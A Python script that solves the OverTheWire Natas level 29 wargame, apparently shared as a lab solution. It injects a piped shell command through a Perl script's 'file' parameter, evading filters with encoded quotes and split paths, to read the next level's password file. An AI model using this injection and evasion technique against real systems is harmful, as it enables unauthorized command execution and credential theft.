import requests

url = "http://natas29.natas.labs.overthewire.org/"
auth = ("natas29", "[PW_HERE]")
session = requests.Session()
session.auth = (auth)

# --------------------------------------
# PAYLOAD EXPLANATION:
# Remote Command Execution (RCE) is possible via the "file" parameter
# however, there’s input sanitization (e.g., blocking semicolons, slashes, etc.)
# so evade filters using:
# - "%22" for double quotes
# - broken-up file path using string concatenation
# - "+" in place of spaces (URL-safe)
# - "tr" to replace newline with space for clean output
# --------------------------------------
payload = "|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27"

# send GET request to the vulnerable Perl script with crafted payload
req = session.get(url+"index.pl?file="+payload)

for i in req.iter_lines():
	decoded = i.decode()
	if "irs" in decoded:
		print(decoded)
